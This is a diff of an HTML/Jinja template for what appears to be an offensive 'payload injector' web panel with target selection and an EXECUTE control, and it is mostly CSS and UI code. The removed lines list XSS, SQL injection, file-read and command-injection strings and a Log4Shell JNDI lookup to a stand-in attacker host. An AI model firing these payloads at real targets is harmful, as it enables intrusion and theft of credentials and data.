+        }
+
+        .copy-output-btn,
+        .download-output-btn {
+            background: rgba(0, 136, 255, 0.2);
+            color: #0088ff;
+            border: 1px solid #0088ff;
+            padding: 8px 12px;
+            border-radius: 4px;
+            font-size: 12px;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            gap: 5px;
+            transition: all 0.3s;
+        }
+
+        .copy-output-btn:hover,
+        .download-output-btn:hover {
+            background: rgba(0, 136, 255, 0.3);
+        }
+
+        .copy-output-btn.success {
+            background: rgba(0, 255, 65, 0.2);
+            color: #00ff41;
+            border-color: #00ff41;
+        }
+
+        .output-content {
+            background: rgba(0, 0, 0, 0.5);
+            border-radius: 4px;
+            overflow: hidden;
+        }
+
+        .output-pre {
+            margin: 0;
+            padding: 15px;
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 12px;
+            line-height: 1.5;
+            max-height: 400px;
+            overflow-y: auto;
+            background: #000;
+        }
+
+        .output-line-container {
+            display: flex;
+            gap: 15px;
+            margin-bottom: 2px;
+        }
+
+        .output-line-number {
+            color: #666;
+            min-width: 40px;
+            text-align: right;
+            user-select: none;
+        }
+
+        .output-line {
+            color: #00ff41;
+            white-space: pre-wrap;
+            word-break: break-all;
+        }
+
+        .output-json {
+            color: #ffcc00;
+            white-space: pre-wrap;
+            word-break: break-all;
+        }
+
+        .output-single-line {
+            padding: 20px;
+            color: #00ff41;
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 14px;
+            text-align: center;
+        }
+
+        .no-output-container {
+            text-align: center;
+            padding: 40px;
+        }
+
+        .no-output-icon {
+            font-size: 48px;
+            color: #666;
+            margin-bottom: 20px;
+        }
+
+        .no-output-title {
+            color: #888;
+            font-size: 18px;
+            margin-bottom: 10px;
+        }
+
+        .no-output-message {
+            color: #666;
+            font-size: 14px;
+        }
+
+        /* === EDITOR FOOTER === */
+        .editor-footer {
+            height: 22px;
+            min-height: 22px;
+            background: rgba(0, 136, 255, 0.2);
+            border-top: 1px solid rgba(0, 136, 255, 0.3);
+            display: flex;
+            align-items: center;
+            padding: 0 15px;
+            font-size: 11px;
+            color: #0088ff;
+            flex-shrink: 0;
+            position: relative;
+            z-index: 10;
+            backdrop-filter: blur(5px);
+            text-shadow: 0 0 5px rgba(0, 136, 255, 0.3);
+        }
+
+        .status-item {
+            display: flex;
+            align-items: center;
+            gap: 6px;
+            margin-right: 20px;
+            font-family: 'JetBrains Mono', monospace;
+        }
+
+        .status-dot {
+            width: 8px;
+            height: 8px;
+            border-radius: 50%;
+            background: #00ff41;
+            box-shadow: 0 0 5px rgba(0, 255, 65, 0.7);
+            animation: pulse 2s infinite;
+        }
+
+        .cursor-position {
+            font-family: 'JetBrains Mono', monospace;
+            color: #ff0088;
+            text-shadow: 0 0 5px rgba(255, 0, 136, 0.5);
+        }
+
+        /* === UTILITY CLASSES === */
+        .scrollbar {
+            scrollbar-width: thin;
+            scrollbar-color: rgba(0, 255, 65, 0.3) rgba(34, 34, 34, 0.8);
+        }
+
+        .scrollbar::-webkit-scrollbar {
+            width: 8px;
+            height: 8px;
+        }
+
+        .scrollbar::-webkit-scrollbar-track {
+            background: rgba(34, 34, 34, 0.8);
+            border-radius: 4px;
+        }
+
+        .scrollbar::-webkit-scrollbar-thumb {
+            background: rgba(0, 255, 65, 0.3);
+            border-radius: 4px;
+            border: 1px solid rgba(0, 255, 65, 0.1);
+        }
+
+        .scrollbar::-webkit-scrollbar-thumb:hover {
+            background: rgba(0, 255, 65, 0.5);
+            box-shadow: 0 0 5px rgba(0, 255, 65, 0.3);
+        }
+
+        /* Loading Animation */
+        .loading {
+            display: inline-block;
+            width: 12px;
+            height: 12px;
+            border: 2px solid #00ff41;
+            border-top-color: transparent;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            filter: drop-shadow(0 0 3px rgba(0, 255, 65, 0.7));
+        }
+
+        /* Glitch effect */
+        .glitch {
+            position: relative;
+            animation: glitch 5s infinite;
+        }
+
+        @keyframes glitch {
+            0%, 100% { transform: translate(0); }
+            1% { transform: translate(-1px, 1px); }
+            2% { transform: translate(-1px, -1px); }
+            3% { transform: translate(1px, 1px); }
+            4% { transform: translate(1px, -1px); }
+            5% { transform: translate(0); }
+        }
+
+        /* Terminal scanline effect */
+        .scanline {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 2px;
+            background: linear-gradient(to bottom, transparent, rgba(0, 255, 65, 0.2), transparent);
+            animation: scan 3s linear infinite;
+            z-index: 3;
+            pointer-events: none;
+        }
+
+        @keyframes scan {
+            0% { top: 0; }
+            100% { top: 100%; }
+        }
+
+        /* === INACTIVE PAYLOADS MODAL STYLES === */
+        .inactive-payloads-list {
+            display: flex;
+            flex-direction: column;
+            gap: 8px;
+        }
+
+        .inactive-payload-item {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 12px 15px;
+            background: rgba(255, 170, 0, 0.1);
+            border: 1px solid rgba(255, 170, 0, 0.3);
+            border-radius: 3px;
+            transition: all 0.3s ease;
+        }
+
+        .inactive-payload-item:hover {
+            background: rgba(255, 170, 0, 0.15);
+            border-color: rgba(255, 170, 0, 0.5);
+            transform: translateX(5px);
+        }
+
+        .payload-info {
+            display: flex;
+            flex-direction: column;
+            gap: 4px;
+        }
+
+        .payload-name {
+            color: #ffaa00;
+            font-weight: 600;
+            font-size: 13px;
+            text-shadow: 0 0 5px rgba(255, 170, 0, 0.5);
+        }
+
+        .payload-status {
+            color: #ff0033;
+            font-size: 11px;
+            font-family: 'JetBrains Mono', monospace;
+            padding: 2px 6px;
+            background: rgba(255, 0, 51, 0.1);
+            border-radius: 2px;
+            display: inline-block;
+            width: fit-content;
+        }
+
+        .activate-btn {
+            padding: 6px 12px;
+            background: rgba(0, 255, 65, 0.2);
+            border: 1px solid rgba(0, 255, 65, 0.3);
+            color: #00ff41;
+            cursor: pointer;
+            border-radius: 2px;
+            font-size: 12px;
+            display: flex;
+            align-items: center;
+            gap: 6px;
+            transition: all 0.3s ease;
+            font-family: 'JetBrains Mono', monospace;
+        }
+
+        .activate-btn:hover {
+            background: rgba(0, 255, 65, 0.3);
+            border-color: #00ff41;
+            box-shadow: 0 0 10px rgba(0, 255, 65, 0.3);
+            transform: translateY(-2px);
+        }
+
+        .activate-btn:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+            transform: none !important;
+        }
+
+        .activate-btn.activating {
+            background: rgba(0, 136, 255, 0.2);
+            border-color: rgba(0, 136, 255, 0.5);
+            color: #0088ff;
+        }
+
+        .activate-btn.activated {
+            background: rgba(0, 255, 65, 0.3);
+            border-color: #00ff41;
+            color: #00ff41;
+        }
+
+        .activate-btn.error-btn {
+            background: rgba(255, 0, 51, 0.2);
+            border-color: rgba(255, 0, 51, 0.5);
+            color: #ff0033;
+            animation: shake 0.5s ease-in-out;
+        }
+
+        /* Output Modal Close Button Styles */
+        .close-output-btn {
+            background: rgba(255, 0, 51, 0.2) !important;
+            border: 1px solid rgba(255, 0, 51, 0.5) !important;
+            color: #ff0033 !important;
+            padding: 8px 16px !important;
+            border-radius: 3px !important;
+            font-size: 14px !important;
+            cursor: pointer !important;
+            display: flex !important;
+            align-items: center !important;
+            gap: 6px !important;
+            transition: all 0.3s ease !important;
+            font-family: 'JetBrains Mono', monospace !important;
+        }
+
+        .close-output-btn:hover {
+            background: rgba(255, 0, 51, 0.3) !important;
+            border-color: #ff0033 !important;
+            box-shadow: 0 0 10px rgba(255, 0, 51, 0.4) !important;
+            transform: translateY(-2px) !important;
+        }
+
+        .output-modal-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 20px;
+            padding-bottom: 15px;
+            border-bottom: 1px solid rgba(0, 255, 65, 0.3);
+        }
+
+        .output-modal-footer {
+            margin-top: 20px;
+            padding-top: 15px;
+            border-top: 1px solid rgba(0, 255, 65, 0.2);
+            text-align: center;
+        }
+
+        @keyframes shake {
+            0%, 100% { transform: translateX(0); }
+            25% { transform: translateX(-5px); }
+            75% { transform: translateX(5px); }
+        }
+
+        /* === RESPONSIVE DESIGN === */
+        @media (max-width: 1024px) {
+            .editor-panel {
+                width: 250px;
+                min-width: 250px;
+            }
+        }
+
+        @media (max-width: 768px) {
+            .sidebar {
+                width: 200px;
+                min-width: 200px;
+            }
+            
+            .editor-panel {
+                position: absolute;
+                right: -100%;
+                top: 50px;
+                bottom: 22px;
+                width: 300px;
+                z-index: 100;
+                transition: right 0.3s;
+            }
+            
+            .editor-panel.active {
+                right: 0;
+            }
+        }
+    </style>
 {% endblock %}
 
 {% block body %}
-<div class="main-container">
-  <header class="header">
-    <h1><i class="fas fa-code"></i> >_ ADVANCED PAYLOAD INJECTOR</h1>
-    <p class="terminal-text">TEST AND ANALYZE PAYLOADS FOR SECURITY RESEARCH PURPOSES ONLY</p>
-  </header>
-
-  <div class="warning-banner">
-    <i class="fas fa-exclamation-triangle"></i>
-    <div>
-      <strong class="terminal-text">WARNING:</strong> THIS TOOL IS FOR AUTHORIZED SECURITY TESTING ONLY. 
-      UNAUTHORIZED USE AGAINST SYSTEMS YOU DON'T OWN IS ILLEGAL.
-    </div>
-  </div>
-
-  <div class="top-container">
-    <!-- Payload Library -->
-    <div class="box">
-      <h3><i class="fas fa-book"></i> PAYLOAD LIBRARY</h3>
-      <table class="payload-table" aria-label="Payload library">
-        <thead>
-          <tr>
-            <th>ID</th>
-            <th>PAYLOAD</th>
-            <th>TYPE</th>
-          </tr>
-        </thead>
-        <tbody>
-          <tr data-payload="alert('XSS')">
-            <td class="terminal-text">1</td>
-            <td class="terminal-text">alert('XSS')</td>
-            <td><span class="payload-type type-xss">XSS</span></td>
-          </tr>
-          <tr data-payload="../etc/passwd">
-            <td class="terminal-text">2</td>
-            <td class="terminal-text">../etc/passwd</td>
-            <td><span class="payload-type type-lfi">LFI</span></td>
-          </tr>
-          <tr data-payload="' OR 1=1 --">
-            <td class="terminal-text">3</td>
-            <td class="terminal-text">' OR 1=1 --</td>
-            <td><span class="payload-type type-sqli">SQLi</span></td>
-          </tr>
-          <tr data-payload="&lt;script&gt;alert(1)&lt;/script&gt;">
-            <td class="terminal-text">4</td>
-            <td class="terminal-text">&lt;script&gt;alert(1)&lt;/script&gt;</td>
-            <td><span class="payload-type type-xss">XSS</span></td>
-          </tr>
-          <tr data-payload="${jndi:ldap://attacker.com/a}">
-            <td class="terminal-text">5</td>
-            <td class="terminal-text">${jndi:ldap://attacker.com/a}</td>
-            <td><span class="payload-type type-lfi">LOG4J</span></td>
-          </tr>
-        </tbody>
-      </table>
-    </div>
-
-    <!-- Code Editor -->
-    <div class="box">
-      <h3><i class="fas fa-edit"></i> PAYLOAD EDITOR</h3>
-      <div class="editor-container">
-        <textarea 
-          id="payloadEditor" 
-          class="editor" 
-          placeholder="// ENTER YOUR PAYLOAD HERE...&#10;// CLICK ON PAYLOADS FROM THE LIBRARY TO INSERT THEM"
-          spellcheck="false"></textarea>
-        <div class="controls">
-          <div class="select-wrapper">
-            <select id="payloadType">
-              <option value="random">RANDOM PAYLOAD</option>
-              <option value="xss">XSS PAYLOADS</option>
-              <option value="lfi">LFI PAYLOADS</option>
-              <option value="sqli">SQLi PAYLOADS</option>
-              <option value="custom">CUSTOM TEMPLATE</option>
-            </select>
-          </div>
-          <div style="display: flex; gap: 10px;">
-            <button id="clearBtn" class="btn btn-danger" aria-label="Clear editor">
-              <i class="fas fa-trash-alt"></i> CLEAR
-            </button>
-            <button id="injectBtn" class="btn btn-primary" aria-label="Inject payload">
-              <i class="fas fa-bolt"></i> INJECT
-            </button>
-          </div>
+<div class="editor-page">
+    <!-- Matrix overlay -->
+    <canvas class="matrix-overlay" id="matrixOverlay"></canvas>
+    
+    <!-- Terminal scanline -->
+    <div class="scanline"></div>
+    
+    <div class="editor-container">
+        <!-- EDITOR HEADER -->
+        <header class="editor-header">
+            <div class="logo">
+                <i class="fas fa-terminal logo-icon"></i>
+                <span class="glitch">PAYLOAD EDITOR v1.0</span>
+            </div>
+            
+            <!-- File Tabs -->
+            <div class="file-tabs scrollbar" id="fileTabs">
+                <div class="file-tab active" id="activeFileTab">
+                    <i class="fas fa-biohazard file-icon"></i>
+                    <span id="currentFileName">SELECT_PAYLOAD</span>
+                </div>
+            </div>
+            
+            <!-- Editor Controls -->
+            <div class="editor-controls">
+                <button class="editor-btn" id="btn-inject">
+                    <i class="fas fa-skull-crossbones"></i>
+                    EXECUTE
+                </button>
+                <button class="editor-btn secondary" id="btn-save">
+                    <i class="fas fa-save"></i>
+                    SAVE
+                </button>
+                <button class="toolbar-btn" onclick="codeEditor.testNotificationSystem()">
+                    <i class="fas fa-bell"></i> TEST NOTIFICATION
+                </button>
+            </div>
+        </header>
+        
+        <!-- EDITOR LAYOUT -->
+        <div class="editor-layout">
+            <!-- LEFT SIDEBAR - PAYLOAD EXPLORER -->
+            <aside class="sidebar scrollbar">
+                <div class="sidebar-header">
+                    <div class="sidebar-title">
+                        <i class="fas fa-database"></i>
+                        PAYLOAD REPOSITORY
+                    </div>
+                </div>
+                
+                <div class="file-tree" id="fileTree">
+                    {% for file in payloads %}
+                        <div class="file-item" data-filename="{{ file }}" onclick="loadPayload('{{ file }}')">
+                            <i class="fas fa-file-code"></i>
+                            <span>{{ file }}</span>
+                        </div>
+                    {% endfor %}
+                </div>
+            </aside>
+            
+            <!-- MAIN EDITOR AREA -->
+            <main class="editor-main">
+                <!-- Editor Toolbar -->
+                <div class="editor-toolbar">
+                    <div class="toolbar-group">
+                        <button class="toolbar-btn" onclick="newFile()">
+                            <i class="fas fa-plus-circle"></i>
+                            NEW
+                        </button>
+                        <button class="toolbar-btn" onclick="showSaveModal()">
+                            <i class="fas fa-save"></i>
+                            SAVE AS
+                        </button>
+                        <select class="target-select" id="targetSelect">
+                            <option value="" disabled selected>TARGET SELECT</option>
+                            {% for target in targets %}
+                                <option value="{{ target[1] }}">{{ target[1] }}</option>
+                            {% endfor %}
+                        </select>
+                        <button class="toolbar-btn" id="validateBtn" onclick="open_list_of_inactive_pyload()">
+                            <i class="fas fa-check-circle"></i>
+                            INACTIVE PAYLOADS
+                        </button>
+                    </div>
+                </div>
+                
+                <!-- Code Editor Container -->
+                <div class="code-container scrollbar">
+                    <!-- Line Numbers -->
+                    <div class="line-numbers" id="lineNumbers">
+                        <!-- Line numbers will be generated dynamically -->
+                    </div>
+                    
+                    <!-- Code Editor - Now a normal textarea -->
+                    <textarea class="code-editor" 
+                         id="codeEditor" 
+                         spellcheck="false"
+                         placeholder="[>] SELECT PAYLOAD FROM REPOSITORY TO BEGIN INJECTION SEQUENCE..."></textarea>
+                </div>
+            </main>
+            
+            <!-- RIGHT PANEL - CONSOLE OUTPUT -->
+            <aside class="editor-panel scrollbar" id="rightPanel">
+                <div class="panel-tabs">
+                    <button class="panel-tab active" onclick="switchPanel('console')">
+                        <i class="fas fa-terminal"></i>
+                        SYSTEM LOG
+                    </button>
+                    <button class="panel-tab" onclick="switchPanel('info')">
+                        <i class="fas fa-info-circle"></i>
+                        PAYLOAD INFO
+                    </button>
+                    <button class="panel-tab" onclick="switchPanel('output')">
+                        <i class="fas fa-terminal"></i>
+                        OUTPUT
+                        <span class="notification-badge" id="outputNotificationBadge"></span>
+                    </button>
+                </div>
+                
+                <div class="panel-content">
+                    <!-- Console Panel -->
+                    <div id="consolePanel">
+                        <div class="console-output" id="consoleOutput">
+                            <div class="console-line info">
+                                [SYSTEM] SpecterPanel v2.5.1 initialized
+                            </div>
+                            <div class="console-line info">
+                                [SECURITY] Encryption layer: AES-256-GCM
+                            </div>
+                            <div class="console-line success">
+                                [READY] Awaiting payload selection...
+                            </div>
+                        </div>
+                    </div>
+                    
+                    <!-- Info Panel -->
+                    <div id="infoPanel" style="display: none;">
+                        <div class="console-line info">
+                            <strong>PAYLOAD METADATA</strong>
+                        </div>
+                        <div class="console-line" id="fileInfo">
+                            STATUS: IDLE
+                        </div>
+                        <div class="console-line" id="filePath">
+                            LOCATION: /payloads/encrypted/
+                        </div>
+                        <div class="console-line" id="fileSize">
+                            SIZE: 0 BYTES
+                        </div>
+                        <div class="console-line" id="fileHash">
+                            HASH: N/A
+                        </div>
+                        <div class="console-line" id="encryptionStatus">
+                            ENCRYPTION: DISABLED
+                        </div>
+                    </div>
+                    
+                    <!-- Output Panel -->
+                    <div id="outputPanel" style="display: none;">
+                        <div class="output-panel-header">
+                            <h3>
+                                <i class="fas fa-terminal"></i>
+                                OUTPUT NOTIFICATIONS
+                                <span class="notification-badge" id="outputNotificationBadge"></span>
+                            </h3>
+                            <button class="clear-all-btn" onclick="codeEditor.clearAllOutputNotifications()">
+                                <i class="fas fa-trash"></i> CLEAR ALL
+                            </button>
+                        </div>
+                        <div id="outputList" class="output-list">
+                            <!-- Output items will be added here -->
+                        </div>
+                    </div>
+                </div>
+            </aside>
         </div>
-      </div>
+        
+        <!-- EDITOR FOOTER -->
+        <footer class="editor-footer">
+            <div class="status-item">
+                <div class="status-dot" id="connectionStatus"></div>
+                <span id="connectionText">CONNECTION: SECURE</span>
+            </div>
+            
+            <div class="cursor-position" id="cursorPosition">
+                LINE 1, COL 1
+            </div>
+            
+            <div class="status-item">
+                <i class="fab fa-python"></i>
+                <span>PYTHON 3.11</span>
+            </div>
+            
+            <div class="status-item">
+                <i class="fas fa-microchip"></i>
+                <span id="charCount">0 BYTES</span>
+            </div>
+        </footer>
     </div>
-  </div>
+</div>
 
-  <!-- Results Panel -->
-  <div class="result">
-    <h3><i class="fas fa-vial"></i> INJECTION RESULTS</h3>
-    <div id="resultOutput" class="result-content terminal-text">
-      >_ WAITING FOR PAYLOAD INJECTION...
+<!-- Save Modal -->
+<div id="saveModal" style="display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0, 0, 0, 0.8); z-index: 1000; align-items: center; justify-content: center;">
+    <div class="output-modal-content">
+        <h3 style="color: #00ff41; margin-bottom: 20px; font-family: 'JetBrains Mono', monospace;">
+            <i class="fas fa-save"></i> SAVE PAYLOAD
+        </h3>
+        <input type="text" id="payloadNameInput" 
+               style="width: 100%; padding: 10px; background: rgba(0,0,0,0.5); border: 1px solid rgba(0, 255, 65, 0.3); color: #00ff41; font-family: 'JetBrains Mono';"
+               placeholder="Enter payload name...">
+        <div style="display: flex; gap: 10px; margin-top: 20px;">
+            <button class="editor-btn secondary" onclick="saveWithName()" style="flex: 1;">
+                <i class="fas fa-save"></i> SAVE
+            </button>
+            <button class="editor-btn" onclick="closeSaveModal()" style="flex: 1;">
+                <i class="fas fa-times"></i> CANCEL
+            </button>
+        </div>
     </div>
-  </div>
+</div>
+
+<!-- Target Selection Modal -->
+<div id="targetModal" style="display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0, 0, 0, 0.8); z-index: 1000; align-items: center; justify-content: center;">
+    <div class="output-modal-content">
+        <h3 style="color: #ff0033; margin-bottom: 20px; font-family: 'JetBrains Mono', monospace;">
+            <i class="fas fa-exclamation-triangle"></i> TARGET REQUIRED
+        </h3>
+        <p style="color: #cccccc; margin-bottom: 20px; font-family: 'JetBrains Mono', monospace;">
+            Please select a target before executing the payload.
+        </p>
+        <select class="target-select" id="modalTargetSelect" style="width: 100%; margin-bottom: 20px;">
+            <option value="" disabled selected>SELECT TARGET</option>
+            {% for target in targets %}
+                <option value="{{ target[0] }}">{{ target[1] }}</option>
+            {% endfor %}
+        </select>
+        <div style="display: flex; gap: 10px;">
+            <button class="editor-btn" onclick="useSelectedTarget()" style="flex: 1;">
+                <i class="fas fa-check"></i> SELECT & EXECUTE
+            </button>
+            <button class="editor-btn secondary" onclick="closeTargetModal()" style="flex: 1;">
+                <i class="fas fa-times"></i> CANCEL
+            </button>
+        </div>
+    </div>
+</div>
+
+<!-- Inactive Payloads Modal -->
+<div id="inactivePayloadsModal" style="display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0, 0, 0, 0.9); z-index: 1000; align-items: center; justify-content: center;">
+    <div class="output-modal-content">
+        <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px; border-bottom: 1px solid rgba(255, 170, 0, 0.3); padding-bottom: 10px;">
+            <h3 style="color: #ffaa00; font-family: 'JetBrains Mono', monospace;" id="inactivePayloadsTitle">
+                <i class="fas fa-skull-crossbones"></i> INACTIVE PAYLOADS
+            </h3>
+            <div style="display: flex; gap: 10px;">
+                <button class="editor-btn secondary" onclick="refreshInactivePayloads()" id="refreshInactiveBtn">
+                    <i class="fas fa-sync-alt"></i> REFRESH
+                </button>
+                <button class="editor-btn" onclick="closeInactivePayloadsModal()">
+                    <i class="fas fa-times"></i> CLOSE
+                </button>
+            </div>
+        </div>
+        
+        <div class="inactive-payloads-list scrollbar" id="inactivePayloadsList" 
+             style="flex: 1; overflow-y: auto; padding: 10px; font-family: 'JetBrains Mono', monospace;">
+            <!-- Inactive payload items will be loaded here -->
+        </div>
+        
+        <div style="margin-top: 20px; padding-top: 15px; border-top: 1px solid rgba(255, 170, 0, 0.2); font-size: 12px; color: #cccccc;">
+            <i class="fas fa-info-circle" style="color: #00ff41; margin-right: 8px;"></i>
+            Select ACTIVATE to change target status from inactive to active
+        </div>
+    </div>
+</div>
+
+<!-- Output Modal -->
+<div id="outputModal" style="display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0, 0, 0, 0.9); z-index: 1000; align-items: center; justify-content: center;">
+    <div class="output-modal-content">
+        <div class="output-modal-header">
+            <h2 id="outputTitle">
+                <i class="fas fa-terminal"></i> OUTPUT
+            </h2>
+            <button class="close-output-modal" onclick="closeOutputModal()">
+                <i class="fas fa-times"></i>
+            </button>
+        </div>
+        <div class="output-modal-body scrollbar" id="modalOutput">
+            <!-- Output content will be loaded here -->
+        </div>
+    </div>
 </div>
 {% endblock %}
 
 {% block script %}
+<!-- First Script Tag - Jinja2 Variables -->
 <script>
-  document.addEventListener('DOMContentLoaded', function() {
-    const payloadEditor = document.getElementById('payloadEditor');
-    const resultOutput = document.getElementById('resultOutput');
-    const injectBtn = document.getElementById('injectBtn');
-    const clearBtn = document.getElementById('clearBtn');
-    const payloadType = document.getElementById('payloadType');
-    const payloadRows = document.querySelectorAll('.payload-table tbody tr');
+    // === front end js variables model ===
+    // Make sure inactive_code_injections_ids is a list of strings
+    const inactive_payloads = JSON.parse('{{ inactive_code_injections_ids|tojson|safe }}') || [];
+</script>
 
-    // Load payload when clicked in the library
-    payloadRows.forEach(row => {
-      row.addEventListener('click', function() {
-        const payload = this.getAttribute('data-payload');
-        payloadEditor.value = payload;
-        
-        // Highlight the selected row
-        payloadRows.forEach(r => r.classList.remove('selected'));
-        this.classList.add('selected');
-      });
-      
-      // Make rows keyboard accessible
-      row.setAttribute('tabindex', '0');
-      row.addEventListener('keydown', function(e) {
-        if (e.key === 'Enter' || e.key === ' ') {
-          this.click();
-          e.preventDefault();
-        }
-      });
-    });
-
-    // Clear editor
-    clearBtn.addEventListener('click', function() {
-      payloadEditor.value = '';
-      resultOutput.textContent = '>_ EDITOR CLEARED. READY FOR NEW PAYLOAD.';
-      resultOutput.className = 'result-content terminal-text';
-    });
-
-    // Handle payload injection
-    injectBtn.addEventListener('click', function() {
-      const payload = payloadEditor.value.trim();
-      
-      if (!payload) {
-        resultOutput.textContent = '>_ ERROR: NO PAYLOAD ENTERED';
-        resultOutput.className = 'result-content result-error';
-        return;
-      }
-      
-      // Simulate injection
-      simulateInjection(payload);
-    });
-
-    // Load payload based on type selection
-    payloadType.addEventListener('change', function() {
-      const type = this.value;
-      let payload = '';
-      
-      switch(type) {
-        case 'random':
-          payload = getRandomPayload();
-          break;
-        case 'xss':
-          payload = '<script>alert("XSS")<\/script>';
-          break;
-        case 'lfi':
-          payload = '../../../../etc/passwd';
-          break;
-        case 'sqli':
-          payload = "' OR '1'='1' --";
-          break;
-        case 'custom':
-          payload = '/* CUSTOMIZE THIS TEMPLATE */\n' + 
-                    'function customPayload() {\n' +
-                    '  // YOUR CUSTOM PAYLOAD LOGIC HERE\n' +
-                    '  return "VULNERABLE";\n' +
-                    '}';
-          break;
-      }
-      
-      payloadEditor.value = payload;
-    });
-
-    // Helper functions
-    function getRandomPayload() {
-      const payloads = [
-        '<img src=x onerror=alert(1)>',
-        '${7*7}',
-        ';cat /etc/passwd',
-        '<svg/onload=alert(1)>',
-        'UNION SELECT username, password FROM users--'
-      ];
-      return payloads[Math.floor(Math.random() * payloads.length)];
-    }
-
-    function simulateInjection(payload) {
-      // Show loading state
-      injectBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> INJECTING...';
-      injectBtn.disabled = true;
-      resultOutput.textContent = '>_ EXECUTING PAYLOAD...';
-      resultOutput.className = 'result-content loading';
-      
-      // Simulate processing delay
-      setTimeout(() => {
-        // Randomly determine if injection was successful
-        const isSuccessful = Math.random() > 0.3;
-        
-        if (isSuccessful) {
-          resultOutput.textContent = `>_ PAYLOAD EXECUTED SUCCESSFULLY!\n\n` +
-                                   `PAYLOAD: ${payload}\n` +
-                                   `VULNERABILITY: ${detectVulnerabilityType(payload)}\n` +
-                                   `RESPONSE: 200 OK\n` +
-                                   `INJECTION POINT: FORM INPUT FIELD\n` +
-                                   `TIMESTAMP: ${new Date().toLocaleTimeString()}`;
-          resultOutput.className = 'result-content result-success';
-        } else {
-          resultOutput.textContent = `>_ PAYLOAD BLOCKED BY SECURITY CONTROLS\n\n` +
-                                   `PAYLOAD: ${payload}\n` +
-                                   `RESPONSE: 403 FORBIDDEN\n` +
-                                   `SECURITY FILTER: ${detectSecurityFilter(payload)}\n` +
-                                   `RECOMMENDATION: TRY ENCODING OR OBFUSCATION`;
-          resultOutput.className = 'result-content result-error';
+<!-- Complete Integrated Script -->
+<script>
+    // === CODE EDITOR CLASS ===
+    class CodeEditor {
+        constructor() {
+            this.editor = document.getElementById('codeEditor');
+            this.lineNumbers = document.getElementById('lineNumbers');
+            this.cursorPosition = document.getElementById('cursorPosition');
+            this.consoleOutput = document.getElementById('consoleOutput');
+            this.currentFileName = document.getElementById('currentFileName');
+            this.connectionStatus = document.getElementById('connectionStatus');
+            this.connectionText = document.getElementById('connectionText');
+            this.fileInfo = document.getElementById('fileInfo');
+            this.filePath = document.getElementById('filePath');
+            this.fileSize = document.getElementById('fileSize');
+            this.fileHash = document.getElementById('fileHash');
+            this.encryptionStatus = document.getElementById('encryptionStatus');
+            this.charCount = document.getElementById('charCount');
+            this.targetSelect = document.getElementById('targetSelect');
+            this.modalTargetSelect = document.getElementById('modalTargetSelect');
+            this.outputList = document.getElementById('outputList');
+            this.outputNotificationBadge = document.getElementById('outputNotificationBadge');
+            
+            // Store targets from backend
+            this.targets = {{ targets|tojson|safe }};
+            
+            this.currentFile = null;
+            this.isLoading = false;
+            this.undoStack = [];
+            this.redoStack = [];
+            this.lineCount = 1;
+            this.isEncrypted = false;
+            this.pendingInjection = false;
+            this.updateCheckInterval = null;
+            this.autoSaveEnabled = false;
+            
+            // Initialize notification tracking
+            this.notificationHistory = [];
+            
+            this.init();
         }
         
-        // Reset button
-        injectBtn.innerHTML = '<i class="fas fa-bolt"></i> INJECT';
-        injectBtn.disabled = false;
-      }, 1500);
-    }
-
-    function detectVulnerabilityType(payload) {
-      if (payload.includes('<script>') || payload.includes('onerror') || payload.includes('onload')) {
-        return 'CROSS-SITE SCRIPTING (XSS)';
-      } else if (payload.includes('../') || payload.includes('/etc/passwd')) {
-        return 'LOCAL FILE INCLUSION (LFI)';
-      } else if (payload.includes('OR 1=1') || payload.includes('UNION SELECT')) {
-        return 'SQL INJECTION (SQLi)';
-      } else if (payload.includes('${')) {
-        return 'TEMPLATE INJECTION';
-      }
-      return 'UNKNOWN VULNERABILITY TYPE';
-    }
-
-    function detectSecurityFilter(payload) {
-      const filters = [
-        'WEB APPLICATION FIREWALL (WAF)',
-        'INPUT VALIDATION FILTER',
-        'CONTENT SECURITY POLICY (CSP)',
-        'MODSECURITY RULES',
-        'SQL INJECTION PREVENTION'
-      ];
-      return filters[Math.floor(Math.random() * filters.length)];
-    }
-
-    // Add Matrix-style typing effect for initial text
-    function typeWriter(element, text, speed = 50) {
-      let i = 0;
-      element.innerHTML = '';
-      function typing() {
-        if (i < text.length) {
-          element.innerHTML += text.charAt(i);
-          i++;
-          setTimeout(typing, speed);
+        init() {
+            this.setupEventListeners();
+            this.generateLineNumbers();
+            this.updateCursorPosition();
+            this.updateCharCount();
+            this.initMatrixOverlay();
+            this.startUpdateChecking();
+            
+            // Load existing notifications from localStorage
+            this.restoreNotifications();
+            
+            // Populate target dropdowns
+            this.populateTargetSelect();
+            
+            // Add initial console message
+            this.addConsoleOutput('[SYSTEM] Code injection module initialized', 'info');
+            this.addConsoleOutput('[SECURITY] Connection encrypted: TLS 1.3', 'success');
+            this.addConsoleOutput('[INFO] Notifications system restored from storage', 'info');
+            this.addConsoleOutput('[READY] Select payload from repository', 'info');
+            
+            // Load initial inactive targets
+            this.fetchInactiveTargets();
         }
-      }
-      typing();
+        
+        // ===== NOTIFICATION PERSISTENCE SYSTEM =====
+        
+        /**
+         * Restore notifications from localStorage on page load
+         */
+        restoreNotifications() {
+            try {
+                // Load notification history
+                const savedHistory = localStorage.getItem('notification_history');
+                if (savedHistory) {
+                    this.notificationHistory = JSON.parse(savedHistory);
+                    console.log('[RESTORE] Loaded', this.notificationHistory.length, 'notifications from history');
+                }
+                
+                // Load active notifications (those still in UI)
+                const savedNotifications = localStorage.getItem('active_notifications');
+                if (savedNotifications && this.outputList) {
+                    const notifications = JSON.parse(savedNotifications);
+                    
+                    console.log('[RESTORE] Restoring', notifications.length, 'active notifications');
+                    
+                    // Restore each notification
+                    notifications.forEach(notification => {
+                        // Check if notification is still valid (not expired)
+                        if (this.isNotificationValid(notification)) {
